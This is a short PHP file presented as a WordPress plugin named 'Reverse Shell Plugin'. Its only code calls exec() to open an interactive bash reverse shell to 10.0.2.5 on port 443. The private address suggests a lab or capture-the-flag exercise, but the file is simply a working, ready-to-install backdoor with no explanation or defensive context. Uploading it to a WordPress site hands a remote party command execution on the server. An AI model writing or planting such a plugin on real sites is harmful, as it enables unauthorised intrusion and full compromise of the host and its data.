<?php
/**
*Plugin Name: Reverse Shell Plugin
*Plugin URI
*Description: Reverse Shell Plugin
* Version: 1.0
* Author: User
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.5/443 0>&1' ");
?>
